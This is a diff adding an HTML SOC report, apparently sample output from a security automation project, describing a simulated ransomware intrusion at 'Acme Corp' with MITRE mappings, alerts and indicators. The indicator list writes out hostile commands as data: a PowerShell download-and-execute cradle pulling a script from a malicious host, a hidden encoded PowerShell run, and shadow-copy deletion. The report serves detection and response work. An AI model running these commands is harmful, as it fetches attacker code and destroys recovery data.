@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>SOC Report - Acme Corp</title>
+<style>
+  :root {
+    --bg: #0f1420; --panel: #161d2e; --panel2: #1d2740; --border: #2a3550;
+    --text: #e6ebf5; --muted: #93a0bf; --accent: #5b8cff;
+    --crit: #ff4d5e; --high: #ff9f45; --med: #ffd23f; --low: #4fd1a5;
+  }
+  * { box-sizing: border-box; }
+  body { margin:0; background:var(--bg); color:var(--text); font-family: -apple-system,Segoe UI,Roboto,Arial,sans-serif; line-height:1.5; }
+  .wrap { max-width: 1080px; margin: 0 auto; padding: 32px 20px 80px; }
+  header { border-bottom:1px solid var(--border); padding-bottom:20px; margin-bottom:28px; }
+  header h1 { margin:0 0 4px; font-size:26px; }
+  header .meta { color:var(--muted); font-size:14px; }
+  .kpis { display:flex; flex-wrap:wrap; gap:12px; margin:24px 0; }
+  .kpi { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:14px 18px; min-width:120px; flex:1; }
+  .kpi .n { font-size:26px; font-weight:700; }
+  .kpi .l { color:var(--muted); font-size:12px; text-transform:uppercase; letter-spacing:.04em; }
+  .kpi.crit .n{color:var(--crit)} .kpi.high .n{color:var(--high)} .kpi.med .n{color:var(--med)} .kpi.low .n{color:var(--low)}
+  section { margin: 36px 0; }
+  h2 { font-size:18px; border-left:4px solid var(--accent); padding-left:10px; margin-bottom:14px; }
+  .card { background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:20px; }
+  .badge { display:inline-block; padding:2px 10px; border-radius:999px; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:.03em; }
+  .badge.critical { background:rgba(255,77,94,.15); color:var(--crit); border:1px solid var(--crit); }
+  .badge.high { background:rgba(255,159,69,.15); color:var(--high); border:1px solid var(--high); }
+  .badge.medium { background:rgba(255,210,63,.15); color:var(--med); border:1px solid var(--med); }
+  .badge.low { background:rgba(79,209,165,.15); color:var(--low); border:1px solid var(--low); }
+  .badge.tag { background:var(--panel2); color:var(--muted); border:1px solid var(--border); }
+  .summary-box { white-space:pre-wrap; font-size:14.5px; }
+  .source-tag { float:right; font-size:11px; color:var(--muted); }
+  .incident { border:1px solid var(--border); border-radius:10px; padding:16px 18px; margin-bottom:16px; background:var(--panel); }
+  .incident h3 { margin:6px 0 8px; font-size:16px; }
+  .incident pre { white-space:pre-wrap; font-family:inherit; font-size:13.5px; color:var(--text); background:var(--panel2); padding:12px; border-radius:8px; }
+  table { width:100%; border-collapse:collapse; font-size:13.5px; }
+  th, td { text-align:left; padding:9px 10px; border-bottom:1px solid var(--border); vertical-align:top; }
+  th { color:var(--muted); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.03em; }
+  tr:hover td { background: rgba(255,255,255,0.02); }
+  .ioc-list { display:flex; flex-wrap:wrap; gap:8px; }
+  .ioc { background:var(--panel2); border:1px solid var(--border); padding:4px 10px; border-radius:6px; font-family:monospace; font-size:12.5px; }
+  footer { color:var(--muted); font-size:12px; margin-top:50px; border-top:1px solid var(--border); padding-top:16px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <h1>SOC Automation Report</h1>
+    <div class="meta">Acme Corp &middot; Generated 2026-09-19 09:31 UTC &middot; Tenant ID: acme_corp</div>
+  </header>
+
+  <div class="kpis">
+    <div class="kpi"><div class="n">16</div><div class="l">Total Alerts</div></div>
+    <div class="kpi crit"><div class="n">12</div><div class="l">Critical</div></div>
+    <div class="kpi high"><div class="n">4</div><div class="l">High</div></div>
+    <div class="kpi med"><div class="n">0</div><div class="l">Medium</div></div>
+    <div class="kpi low"><div class="n">0</div><div class="l">Low</div></div>
+    <div class="kpi"><div class="n">1</div><div class="l">Correlated Incidents</div></div>
+  </div>
+
+  <section>
+    <h2>Executive Summary</h2>
+    <div class="card">
+      <span class="source-tag">Template-Based</span>
+      <div class="summary-box">During this reporting period, Acme Corp&#39;s environment triggered 16 security alert(s), including 12 critical and 4 high severity finding(s). The correlation engine identified 1 multi-stage attack incident(s), the most severe being: Multi-stage attack chain involving svc_admin (hosts: APPSERVER-02, DC-01, FILESERVER-01, WKSTN-07). This chain involved 10 distinct MITRE ATT&amp;CK technique(s), indicating a coordinated intrusion rather than isolated noise.
+
+Recommended Immediate Actions:
+- Prioritize triage of all CRITICAL severity alerts within 1 hour.
+- Force a credential reset for every account involved in a correlated incident.
+- Isolate affected hosts from the network pending forensic review.
+- Validate backups are intact and offline if ransomware indicators were present.
+- Block IOCs (IPs, domains, hashes) listed in this report at the firewall/EDR.
+- Review MITRE ATT&amp;CK coverage gaps against current detection rules.</div>
+    </div>
+  </section>
+
+  <section>
+    <h2>Correlated Attack Chains (1)</h2>
+    
+      
+      <div class="incident">
+        <span class="badge critical">critical</span>
+        <h3>Multi-stage attack chain involving svc_admin (hosts: APPSERVER-02, DC-01, FILESERVER-01, WKSTN-07)</h3>
+        <div style="color:var(--muted); font-size:13px; margin-bottom:8px;">
+          Entity: svc_admin (hosts: APPSERVER-02, DC-01, FILESERVER-01, WKSTN-07) &middot; 15 alerts &middot; MITRE chain: T1566 &amp;rarr; T1204 &amp;rarr; T1059.001 &amp;rarr; T1110 &amp;rarr; T1003.001 &amp;rarr; T1053.005 &amp;rarr; T1547.001 &amp;rarr; T1021.002 &amp;rarr; T1490 &amp;rarr; T1486
+        </div>
+        <pre>Correlated attack chain spanning 15 alerts across 8 detection modules, tied together by svc_admin (hosts: APPSERVER-02, DC-01, FILESERVER-01, WKSTN-07), from 2026-09-18T08:00:00+00:00 to 2026-09-18T08:33:10+00:00:
+(1) [Initial Access] Phishing email delivered to jdoe@ourcompany.com [T1566]
+(2) [Execution] VirusTotal flagged domain as malicious: free-invoice-pay.top [T1204]
+(3) [Execution] VirusTotal flagged domain as malicious: free-invoice-pay.top [T1204]
+(4) [Execution] VirusTotal flagged hash as malicious: 44d88612fea8a8f36de82e1278abb02f [T1204]
+(5) [Execution] Suspicious PowerShell execution on WKSTN-07 [T1059.001]
+(6) [Credential Access] Brute force against &#39;svc_admin&#39; on DC-01 - FOLLOWED BY SUCCESSFUL LOGON [T1110]
+(7) [Credential Access] Credential dumping attempt: mimikatz.exe accessed LSASS on WKSTN-07 [T1003.001]
+(8) [Persistence] Suspicious scheduled task created on WKSTN-07 [T1053.005]
+(9) [Persistence] Suspicious registry Run key added on WKSTN-07 [T1547.001]
+(10) [Lateral Movement] PsExec-style lateral movement to FILESERVER-01 [T1021.002]
+(11) [Lateral Movement] PsExec-style lateral movement to APPSERVER-02 [T1021.002]
+(12) [Lateral Movement] Account &#39;svc_admin&#39; accessed admin shares on 3 hosts rapidly [T1021.002]
+(13) [Lateral Movement] PsExec-style lateral movement to DC-01 [T1021.002]
+(14) [Impact] Shadow copy deletion detected on FILESERVER-01 [T1490]
+(15) [Impact] Mass file encryption detected on FILESERVER-01 [T1486]</pre>
+      </div>
+      
+    
+  </section>
+
+  <section>
+    <h2>MITRE ATT&amp;CK Coverage</h2>
+    <div class="card">
+      <table>
+        <tr><th>Technique</th><th>Name</th><th>Tactic</th><th>Alerts</th></tr>
+        
+        <tr>
+          <td><span class="badge tag">T1021.002</span></td>
+          <td>Remote Services: SMB/Windows Admin Shares</td>
+          <td>Lateral Movement</td>
+          <td>4</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1204</span></td>
+          <td>User Execution (Malicious File/Link)</td>
+          <td>Execution</td>
+          <td>3</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1566</span></td>
+          <td>Phishing</td>
+          <td>Initial Access</td>
+          <td>1</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1059.001</span></td>
+          <td>Command and Scripting Interpreter: PowerShell</td>
+          <td>Execution</td>
+          <td>1</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1110</span></td>
+          <td>Brute Force</td>
+          <td>Credential Access</td>
+          <td>1</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1003.001</span></td>
+          <td>OS Credential Dumping: LSASS Memory</td>
+          <td>Credential Access</td>
+          <td>1</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1053.005</span></td>
+          <td>Scheduled Task/Job: Scheduled Task</td>
+          <td>Persistence</td>
+          <td>1</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1547.001</span></td>
+          <td>Registry Run Keys / Startup Folder</td>
+          <td>Persistence</td>
+          <td>1</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1490</span></td>
+          <td>Inhibit System Recovery</td>
+          <td>Impact</td>
+          <td>1</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1486</span></td>
+          <td>Data Encrypted for Impact</td>
+          <td>Impact</td>
+          <td>1</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge tag">T1078</span></td>
+          <td>Valid Accounts</td>
+          <td>Initial Access / Defense Evasion</td>
+          <td>1</td>
+        </tr>
+        
+      </table>
+    </div>
+  </section>
+
+  <section>
+    <h2>Indicators of Compromise (IOCs)</h2>
+    <div class="card">
+      <div class="ioc-list">
+        <span class="ioc">10.0.1.15</span><span class="ioc">103.21.244.10</span><span class="ioc">185.220.101.47</span><span class="ioc">44d88612fea8a8f36de82e1278abb02f</span><span class="ioc">74.125.21.100</span><span class="ioc">C:\Users\svc_admin\AppData\Local\Temp\mimikatz.exe</span><span class="ioc">C:\Users\svc_admin\AppData\Roaming\upd.exe</span><span class="ioc">IEX (New-Object Net.WebClient).DownloadString(&#39;http://malicious-update-server.com/p.ps1&#39;)</span><span class="ioc">Invoice_48213.js</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_0.xlsx.locked</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_1.xlsx.locked</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_2.xlsx.locked</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_3.xlsx.locked</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_4.xlsx.locked</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_5.xlsx.locked</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_6.xlsx.locked</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_7.xlsx.locked</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_8.xlsx.locked</span><span class="ioc">\\FILESERVER-01\Shares\Finance\report_9.xlsx.locked</span><span class="ioc">billing-support@free-invoice-pay.top</span><span class="ioc">free-invoice-pay.top</span><span class="ioc">http://free-invoice-pay.top/inv/click?id=48213</span><span class="ioc">powershell.exe -enc &lt;base64&gt; -w hidden -File C:\Users\svc_admin\AppData\Roaming\upd.ps1</span><span class="ioc">vssadmin delete shadows /all /quiet</span>
+        
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>All Alerts (16)</h2>
+    <div class="card" style="overflow-x:auto;">
+      <table>
+        <tr><th>Time</th><th>Severity</th><th>Detector</th><th>Title</th><th>Entity</th><th>MITRE</th></tr>
+        
+        <tr>
+          <td>2026-09-18T08:00:00+00:00</td>
+          <td><span class="badge high">high</span></td>
+          <td>phishing_detector</td>
+          <td>Phishing email delivered to jdoe@ourcompany.com</td>
+          <td>jdoe</td>
+          <td>T1566</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:00:00+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>virustotal_checker</td>
+          <td>VirusTotal flagged domain as malicious: free-invoice-pay.top</td>
+          <td>jdoe</td>
+          <td>T1204</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:00:00+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>virustotal_checker</td>
+          <td>VirusTotal flagged domain as malicious: free-invoice-pay.top</td>
+          <td>jdoe</td>
+          <td>T1204</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:06:00+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>virustotal_checker</td>
+          <td>VirusTotal flagged hash as malicious: 44d88612fea8a8f36de82e1278abb02f</td>
+          <td>jdoe</td>
+          <td>T1204</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:08:00+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>powershell_analyzer</td>
+          <td>Suspicious PowerShell execution on WKSTN-07</td>
+          <td>jdoe</td>
+          <td>T1059.001</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:10:30+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>brute_force</td>
+          <td>Brute force against &#39;svc_admin&#39; on DC-01 - FOLLOWED BY SUCCESSFUL LOGON</td>
+          <td>svc_admin</td>
+          <td>T1110</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:14:00+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>lsass_mimikatz</td>
+          <td>Credential dumping attempt: mimikatz.exe accessed LSASS on WKSTN-07</td>
+          <td>svc_admin</td>
+          <td>T1003.001</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:18:00+00:00</td>
+          <td><span class="badge high">high</span></td>
+          <td>persistence</td>
+          <td>Suspicious scheduled task created on WKSTN-07</td>
+          <td>svc_admin</td>
+          <td>T1053.005</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:19:00+00:00</td>
+          <td><span class="badge high">high</span></td>
+          <td>persistence</td>
+          <td>Suspicious registry Run key added on WKSTN-07</td>
+          <td>svc_admin</td>
+          <td>T1547.001</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:22:40+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>lateral_movement</td>
+          <td>PsExec-style lateral movement to FILESERVER-01</td>
+          <td>svc_admin</td>
+          <td>T1021.002</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:26:20+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>lateral_movement</td>
+          <td>PsExec-style lateral movement to APPSERVER-02</td>
+          <td>svc_admin</td>
+          <td>T1021.002</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:29:20+00:00</td>
+          <td><span class="badge high">high</span></td>
+          <td>lateral_movement</td>
+          <td>Account &#39;svc_admin&#39; accessed admin shares on 3 hosts rapidly</td>
+          <td>svc_admin</td>
+          <td>T1021.002</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:30:00+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>lateral_movement</td>
+          <td>PsExec-style lateral movement to DC-01</td>
+          <td>svc_admin</td>
+          <td>T1021.002</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:32:00+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>ransomware</td>
+          <td>Shadow copy deletion detected on FILESERVER-01</td>
+          <td>svc_admin</td>
+          <td>T1490</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T08:33:10+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>ransomware</td>
+          <td>Mass file encryption detected on FILESERVER-01</td>
+          <td>svc_admin</td>
+          <td>T1486</td>
+        </tr>
+        
+        <tr>
+          <td>2026-09-18T10:40:00+00:00</td>
+          <td><span class="badge critical">critical</span></td>
+          <td>impossible_travel</td>
+          <td>Impossible travel for &#39;ceo@ourcompany.com&#39;: Mumbai -&gt; New York</td>
+          <td>ceo@ourcompany.com</td>
+          <td>T1078</td>
+        </tr>
+        
+      </table>
+    </div>
+  </section>
+
+  <footer>Generated by SOC Automation Project &middot; 2026-09-19 09:31 UTC &middot; This report is confidential.</footer>
+</div>
+</body>
+</html>
